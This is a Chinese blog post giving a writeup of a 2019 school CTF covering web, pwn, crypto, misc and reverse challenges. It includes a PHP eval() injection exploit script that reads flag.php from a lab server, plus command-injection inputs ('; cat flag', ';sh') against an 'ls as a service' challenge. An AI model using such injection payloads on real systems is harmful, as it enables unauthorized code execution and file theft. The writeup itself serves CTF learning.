<!doctype html><html lang=zh><head><meta name=viewport content="width=device-width,initial-scale=1"><title>xatuctf2019 校赛 writeup</title>
<meta charset=utf-8><meta name=description content="Ladder@代打出题人"><meta name=author content="map[email:batkiz@outlook.com name:Jinglue]"><link rel=canonical href=https://blog.batkiz.com/posts/xatuctf2019-wp/><link rel=alternate type=application/rss+xml href=https://blog.batkiz.com//index.xml title="not b@tk1z"><meta property="og:url" content="https://blog.batkiz.com/posts/xatuctf2019-wp/"><meta property="og:site_name" content="not b@tk1z"><meta property="og:title" content="xatuctf2019 校赛 writeup"><meta property="og:description" content="代打出题人"><meta property="og:locale" content="zh"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-04-19T21:57:00+00:00"><meta property="article:modified_time" content="2019-04-19T21:57:00+00:00"><meta property="article:tag" content="Ctf"><meta name=twitter:card content="summary"><meta name=twitter:title content="xatuctf2019 校赛 writeup"><meta name=twitter:description content="代打出题人"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"xatuctf2019 校赛 writeup","item":"https://blog.batkiz.com/posts/xatuctf2019-wp/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"xatuctf2019 校赛 writeup","name":"xatuctf2019 校赛 writeup","description":"代打出题人","keywords":["ctf"],"articleBody":"2019.4.14 校赛，由于之前没办萌新赛，所以这次的题有点水 23333\nWEB 你能读到 flag 吗 题目：\n\u003c?php error_reporting(0); show_source(__FILE__); $a = @$_REQUEST['hello']; eval(\"var_dump($a);\");?\u003e 谷歌之，原题，直接复制提交。\n使用 file_get_contents() 方法获得 flag\npython 代码如下\nimport requests s=requests.session() body = {\"hello\":\"file_get_contents('flag.php')\"} r = s.post(\"http://192.168.1.5:23114/read.php\", data=body) print(r.content) phpdecode 直接搜 1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY= 找到了别人的 wp，flag 获得。\n1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY= \u003c?php error_reporting(0); require __DIR__.'/lib.php'; echo base64_encode(hex2bin(strrev(bin2hex($flag)))), ''; highlight_file(__FILE__);?\u003e 可知加密为 base64_encode(hex2bin(strrev(bin2hex($flag))))，一层一层解密，python 脚本如下\nfrom base64 import b64decode from binascii import hexlify, unhexlify code = \"1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=\" print(unhexlify(hexlify(b64decode(code))[::-1])) PWN nc from 0 to 1 直接 nc 连接即可获得 flag\nls1 ls as a service，将输入的字符传递为 ls 的 args，多试几次即可得出文件目录结构，精简后的如下：\n. ├── bin │ ├── cat │ ├── ls │ └── sh ├── flag └── ls1 传入 ; cat flag 即可读到 ls2 ls as a service v2，限制了传入 args 的字符数为 3，无法直接 cat flag。 由于 bin 下存在 sh，通过 ;sh 唤起 shell，读取 flag。\nCRYPTO dididi ..-. .-.. .- --. ..-. -.. ....- .---- . .---- ..--- -.. ----- ...-- .---- -.-. ..--- . -.. -.... -.-. ..-. ---.. ---.. ---.. -.... ...-- ---.. . -.... -.... -... . ....- -.. .\n摩斯密码\nCaesar cipher kqfl{Hfjxfw_hnumjw_1x_xt_xnruqj}\n凯撒加密\nrc4 cipher:wRTwnbjEAf6T22dYzyKgtBzQ/ydMmNqmf3WeW9E= key:eGF0dXNlYw== rc4 加密，唯一需要注意的是 key 可能需要经过一次 base64 解密。\nDatababy 数码宝贝中的字母表，对照即可。\n（由此题可以知道出题人没再手动复现题，因为 datababy 并不能搜到数码宝贝。其官方英文名称为 Digital monster 。\nbaby RSA 与下面的 esayRSA 相同，用现成的库就好\n110 ONE -\u003e 1 ZERO -\u003e 0 得到一长长长长长长长长长长长长长长长长长长长长长串 0 和 1。\n每八位二进制转 ASCII 即可获得 flag。\neasy RSA n = 9637828843823500407917687664441327784714605952794831018467094508166140790258515855681653788687192363262499178812675284846293988948568322307302995971433129 e = 65537 c = 1736476276571471518318904802453151397043836796931780608028216447791913603812271065838523639504410549594365173220377575243217983329182149750696526310732151 https://github.com/3summer/CTF-RSA-tool\nMISC 这个容易，就是有点累 一个压缩了几千层的 zip 包，可以直接上十六进制查看器(winhex, hxd, 010 editor 等)打开，Ctrl + F flag 即可得到。\n据写脚本解压的小伙伴称他们跑了一个多小时（\n压缩脚本如下\n#!/bin/bash name1=`cat /dev/urandom | sed 's/[^a-zA-Z0-9]//g' | strings -n 6 | head -n 1` name2=\".zip\" name=$name1$name2 #echo $name zip -m $name flag while true do name1=`cat /dev/urandom | sed 's/[^a-zA-Z0-9]//g' | strings -n 6 | head -n 1` name=$name1$name2 zip -m $name *.zip done Fibs 求斐波那契数列第 1234 项，然后 md5(hex(Fibs(1234)))，（转小写后）即为 flag。\n看到这个题……肯定不能自己现场写算法，否则会被跑炸内存的。直接谷歌斐波那契数列快速求第 N 项，得到 O(log N) 的算法后写脚本求项。\n脚本如下\ndef Fibonacci_recursion_fast(n): if n == 0: return 0 if n == 1: return 1 k = (n + 1) / 2 if n % 2 else n / 2 fib_k = Fibonacci_recursion_fast(k) fib_k_1 = Fibonacci_recursion_fast(k - 1) return fib_k**2 + fib_k_1**2 if n % 2 else (2 * fib_k_1 + fib_k) * fib_k print(hex(Fibonacci_recursion_fast(1234))) md5 一下，再转小写提交。\nREVERSE Snake 贪吃蛇，玩到 70 分就出 flag\nssta’s Python 教室 给的是一个 pyc 文件，在线反编译，得到的代码如下。\n# encoding: utf-8 from base64 import b32encode import codecs def b32(s): return b32encode(s) def rot13(s): return codecs.encode(s, 'rot13') # return s.encode('rot13') def reverse(s): return s[::-1] def reverseSomeByte(s): return s[-6:] + s[:-6] def main(): flag = '******************************' cipher = reverse(b32(rot13(reverseSomeByte(flag)))) print(cipher) print('=== WELCOME TO XATUCTF2019 ===') return 'C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN' if __name__ == '__main__': ffllaagg = main() print('FLAG is right here. Can you get it?', ffllaagg) 重点是 cipher = reverse(b32(rot13(reverseSomeByte(flag))))，与 phpencode 相似，自己写脚本一层一层解密即可。 自己写的不完善的脚本如下\n# -*- encoding: utf-8 -*- from base64 import b32decode import codecs def b32(s): return b32decode(s) def rot13(s): return codecs.decode(s, 'rot13') def reverse(s): return s[::-1] cipher = 'C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN' print(rot13(b32(reverse(cipher)).decode(\"ASCII\"))) 前六位移到最后即可。\n自己没做出来的题就没写 wp 23333\n","wordCount":"1114","inLanguage":"zh","datePublished":"2019-04-19T21:57:00Z","dateModified":"2019-04-19T21:57:00Z","author":{"@type":"Person","name":{"email":"batkiz@outlook.com","name":"Jinglue"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.batkiz.com/posts/xatuctf2019-wp/"},"publisher":{"@type":"Organization","name":"not b@tk1z","logo":{"@type":"ImageObject","url":"https://blog.batkiz.com/favicon.ico"}}}</script><link rel=icon href=/favicon.ico sizes=16x16><link rel=apple-touch-icon href=/favicon.ico><link rel=manifest href=/favicon.ico><link rel=preconnect href=https://fonts.loli.net><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.loli.net/css2?family=Noto+Serif:ital,wght@0,100..900;1,100..900&display=swap" rel=stylesheet><link href="https://fonts.loli.net/css2?family=Noto+Serif+SC&family=Noto+Serif:ital,wght@0,100..900;1,100..900&display=swap" rel=stylesheet><link href="https://fonts.loli.net/css2?family=IBM+Plex+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&family=Noto+Serif+SC&family=Noto+Serif:ital,wght@0,100..900;1,100..900&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.min.28245603abfbc0a0a9ef30287c2872f82f0e6075e5b630bff570c8480b95b904.css integrity="sha256-KCRWA6v7wKCp7zAofChy+C8OYHXltjC/9XDISAuVuQQ=" crossorigin=anonymous media=screen><link rel=stylesheet href=/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css><script src=/js/highlight.min.min.c607d6febd16934a82eb61d3a896ed9d869f54373cc63ce95864ed5488fe3128.js></script><script>hljs.highlightAll()</script><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script></head><body><main class=wrapper><nav class=navigation><section class=container><a class=navigation-brand href=/>not b@tk1z
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><span></span><span></span><span></span></label><ul class=navigation-list id=navigation-list><li class="navigation-item navigation-menu"><a class=navigation-link href=/posts>文章</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/links>链接</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/atom.xml>RSS</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/about>关于</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class="navigation-item navigation-social"><a class=navigation-link href=https://github.com/batkiz><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></li><li class="navigation-item navigation-social"><a class=navigation-link href=mailto:batkiz@outlook.com><svg viewBox="0 0 24 24" width="20" height="20" class="main-grid-item-icon" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></a></li><li class="navigation-item navigation-dark"><button id=mode type=button aria-label="toggle user light or dark theme">
<span class=toggle-dark><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span>
<span class=toggle-light><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button></li></ul></section></nav><div id=content><article class=blog-single><header class=blog-title><h1>xatuctf2019 校赛 writeup</h1></header><p><small>2019年4月19日&nbsp;· 1114 字&nbsp;· 3 分钟</small>
<small>·
<a href=https://blog.batkiz.com/tags/ctf/>Ctf</a></small><p><div class=blog-toc><nav id=TableOfContents><ul><li><a href=#web>WEB</a><ul><li><a href=#你能读到-flag-吗>你能读到 flag 吗</a></li><li><a href=#phpdecode>phpdecode</a></li></ul></li><li><a href=#pwn>PWN</a><ul><li><a href=#nc-from-0-to-1>nc from 0 to 1</a></li><li><a href=#ls1>ls1</a></li><li><a href=#ls2>ls2</a></li></ul></li><li><a href=#crypto>CRYPTO</a><ul><li><a href=#dididi>dididi</a></li><li><a href=#caesar-cipher>Caesar cipher</a></li><li><a href=#rc4>rc4</a></li><li><a href=#datababy>Datababy</a></li><li><a href=#baby-rsa>baby RSA</a></li><li><a href=#110>110</a></li><li><a href=#easy-rsa>easy RSA</a></li></ul></li><li><a href=#misc>MISC</a><ul><li><a href=#这个容易就是有点累>这个容易，就是有点累</a></li><li><a href=#fibs>Fibs</a></li></ul></li><li><a href=#reverse>REVERSE</a><ul><li><a href=#snake>Snake</a></li><li><a href=#sstas-python-教室>ssta&rsquo;s Python 教室</a></li></ul></li></ul></nav></div><section class=blog-content><p>2019.4.14 校赛，由于之前没办萌新赛，所以这次的题有点水 23333</p><h2 id=web>WEB</h2><h3 id=你能读到-flag-吗>你能读到 flag 吗</h3><p>题目：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span> <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$a <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>$_REQUEST[<span style=color:#e6db74>&#39;hello&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#34;var_dump(</span><span style=color:#e6db74>$a</span><span style=color:#e6db74>);&#34;</span>);<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p><del>谷歌之，原题，直接复制提交。</del></p><p>使用 <code>file_get_contents()</code> 方法获得 flag</p><p>python 代码如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>s<span style=color:#f92672>=</span>requests<span style=color:#f92672>.</span>session()
</span></span><span style=display:flex><span>body <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;hello&#34;</span>:<span style=color:#e6db74>&#34;file_get_contents(&#39;flag.php&#39;)&#34;</span>}
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#34;http://192.168.1.5:23114/read.php&#34;</span>, data<span style=color:#f92672>=</span>body)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>content)
</span></span></code></pre></div><h3 id=phpdecode>phpdecode</h3><p><del>直接搜 <code>1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</code> 找到了别人的 wp，flag 获得。</del></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#a6e22e>wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY</span><span style=color:#f92672>=</span> <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>require</span> <span style=color:#66d9ef>__DIR__</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/lib.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>hex2bin</span>(<span style=color:#a6e22e>strrev</span>(<span style=color:#a6e22e>bin2hex</span>($flag)))), <span style=color:#e6db74>&#39;&lt;hr&gt;&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>可知加密为 <code>base64_encode(hex2bin(strrev(bin2hex($flag))))</code>，一层一层解密，python 脚本如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64decode
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> binascii <span style=color:#f92672>import</span> hexlify, unhexlify
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>code <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(unhexlify(hexlify(b64decode(code))[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]))
</span></span></code></pre></div><h2 id=pwn>PWN</h2><h3 id=nc-from-0-to-1>nc from 0 to 1</h3><p>直接 nc 连接即可获得 flag</p><h3 id=ls1>ls1</h3><p>ls as a service，将输入的字符传递为 ls 的 args，多试几次即可得出文件目录结构，精简后的如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>.
</span></span><span style=display:flex><span>├── bin
</span></span><span style=display:flex><span>│   ├── cat
</span></span><span style=display:flex><span>│   ├── ls
</span></span><span style=display:flex><span>│   └── sh
</span></span><span style=display:flex><span>├── flag
</span></span><span style=display:flex><span>└── ls1
</span></span></code></pre></div><p>传入 <code>; cat flag</code> 即可读到
<img src=https://s2.ax1x.com/2019/04/19/E92wlT.png alt=ls1></p><h3 id=ls2>ls2</h3><p>ls as a service v2，限制了传入 args 的字符数为 3，无法直接 <code>cat flag</code>。
由于 <code>bin</code> 下存在 <code>sh</code>，通过 <code>;sh</code> 唤起 shell，读取 flag。</p><p><img src=https://s2.ax1x.com/2019/04/19/E9206U.png alt=ls2></p><h2 id=crypto>CRYPTO</h2><h3 id=dididi>dididi</h3><p><code>..-. .-.. .- --. ..-. -.. ....- .---- . .---- ..--- -.. ----- ...-- .---- -.-. ..--- . -.. -.... -.-. ..-. ---.. ---.. ---.. -.... ...-- ---.. . -.... -.... -... . ....- -.. .</code></p><p>摩斯密码</p><h3 id=caesar-cipher>Caesar cipher</h3><p><code>kqfl{Hfjxfw_hnumjw_1x_xt_xnruqj}</code></p><p>凯撒加密</p><h3 id=rc4>rc4</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>cipher:wRTwnbjEAf6T22dYzyKgtBzQ/ydMmNqmf3WeW9E=
</span></span><span style=display:flex><span>key:eGF0dXNlYw==
</span></span></code></pre></div><p><a href=http://ctf.ssleye.com/rc4.html>rc4 加密</a>，唯一需要注意的是 key 可能需要经过一次 base64 解密。</p><h3 id=datababy>Datababy</h3><p>数码宝贝中的字母表，对照即可。</p><p>（由此题可以知道出题人没再手动复现题，因为 datababy 并不能搜到数码宝贝。其官方英文名称为 <em>Digital monster</em> 。</p><h3 id=baby-rsa>baby RSA</h3><p>与下面的 esayRSA 相同，用现成的库就好</p><h3 id=110>110</h3><p>ONE -> 1
ZERO -> 0
得到一长长长长长长长长长长长长长长长长长长长长长串 0 和 1。</p><p>每八位二进制转 ASCII 即可获得 flag。</p><h3 id=easy-rsa>easy RSA</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>n = 9637828843823500407917687664441327784714605952794831018467094508166140790258515855681653788687192363262499178812675284846293988948568322307302995971433129
</span></span><span style=display:flex><span>e = 65537
</span></span><span style=display:flex><span>c = 1736476276571471518318904802453151397043836796931780608028216447791913603812271065838523639504410549594365173220377575243217983329182149750696526310732151
</span></span></code></pre></div><p><a href=https://github.com/3summer/CTF-RSA-tool>https://github.com/3summer/CTF-RSA-tool</a></p><h2 id=misc>MISC</h2><h3 id=这个容易就是有点累>这个容易，就是有点累</h3><p>一个压缩了几千层的 zip 包，可以直接上十六进制查看器(winhex, hxd, 010 editor 等)打开，Ctrl + F flag 即可得到。</p><p>据写脚本解压的小伙伴称他们跑了一个多小时（</p><p>压缩脚本如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>name1<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>cat /dev/urandom | sed <span style=color:#e6db74>&#39;s/[^a-zA-Z0-9]//g&#39;</span> | strings -n <span style=color:#ae81ff>6</span> | head -n 1<span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>name2<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;.zip&#34;</span>
</span></span><span style=display:flex><span>name<span style=color:#f92672>=</span>$name1$name2
</span></span><span style=display:flex><span><span style=color:#75715e>#echo $name</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>zip -m $name flag
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> true
</span></span><span style=display:flex><span><span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span> name1<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>cat /dev/urandom | sed <span style=color:#e6db74>&#39;s/[^a-zA-Z0-9]//g&#39;</span> | strings -n <span style=color:#ae81ff>6</span> | head -n 1<span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span> name<span style=color:#f92672>=</span>$name1$name2
</span></span><span style=display:flex><span> zip -m $name *.zip
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span></code></pre></div><h3 id=fibs>Fibs</h3><p>求斐波那契数列第 1234 项，然后 md5(hex(Fibs(1234)))，（转小写后）即为 flag。</p><p>看到这个题……肯定不能自己现场写算法，否则会被跑炸内存的。直接谷歌斐波那契数列快速求第 N 项，得到 O(log N) 的算法后写脚本求项。</p><p>脚本如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>Fibonacci_recursion_fast</span>(n):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> n <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> n <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    k <span style=color:#f92672>=</span> (n <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>2</span> <span style=color:#66d9ef>if</span> n <span style=color:#f92672>%</span> <span style=color:#ae81ff>2</span> <span style=color:#66d9ef>else</span> n <span style=color:#f92672>/</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>    fib_k <span style=color:#f92672>=</span> Fibonacci_recursion_fast(k)
</span></span><span style=display:flex><span>    fib_k_1 <span style=color:#f92672>=</span> Fibonacci_recursion_fast(k <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> fib_k<span style=color:#f92672>**</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>+</span> fib_k_1<span style=color:#f92672>**</span><span style=color:#ae81ff>2</span> <span style=color:#66d9ef>if</span> n <span style=color:#f92672>%</span> <span style=color:#ae81ff>2</span> <span style=color:#66d9ef>else</span> (<span style=color:#ae81ff>2</span> <span style=color:#f92672>*</span> fib_k_1 <span style=color:#f92672>+</span> fib_k) <span style=color:#f92672>*</span> fib_k
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(hex(Fibonacci_recursion_fast(<span style=color:#ae81ff>1234</span>)))
</span></span></code></pre></div><p>md5 一下，再转小写提交。</p><h2 id=reverse>REVERSE</h2><h3 id=snake>Snake</h3><p>贪吃蛇，玩到 70 分就出 flag</p><h3 id=sstas-python-教室>ssta&rsquo;s Python 教室</h3><p>给的是一个 pyc 文件，在线反编译，得到的代码如下。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e># encoding: utf-8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b32encode
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> codecs
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>b32</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> b32encode(s)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rot13</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> codecs<span style=color:#f92672>.</span>encode(s, <span style=color:#e6db74>&#39;rot13&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#75715e># return s.encode(&#39;rot13&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reverse</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reverseSomeByte</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s[<span style=color:#f92672>-</span><span style=color:#ae81ff>6</span>:] <span style=color:#f92672>+</span> s[:<span style=color:#f92672>-</span><span style=color:#ae81ff>6</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;******************************&#39;</span>
</span></span><span style=display:flex><span>    cipher <span style=color:#f92672>=</span> reverse(b32(rot13(reverseSomeByte(flag))))
</span></span><span style=display:flex><span>    print(cipher)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;=== WELCOME TO XATUCTF2019 ===&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    ffllaagg <span style=color:#f92672>=</span> main()
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;FLAG is right here. Can you get it?&#39;</span>, ffllaagg)
</span></span></code></pre></div><p>重点是 <code>cipher = reverse(b32(rot13(reverseSomeByte(flag))))</code>，与 phpencode 相似，自己写脚本一层一层解密即可。
自己写的不完善的脚本如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e># -*- encoding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b32decode
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> codecs
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>b32</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> b32decode(s)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rot13</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> codecs<span style=color:#f92672>.</span>decode(s, <span style=color:#e6db74>&#39;rot13&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>reverse</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cipher <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN&#39;</span>
</span></span><span style=display:flex><span>
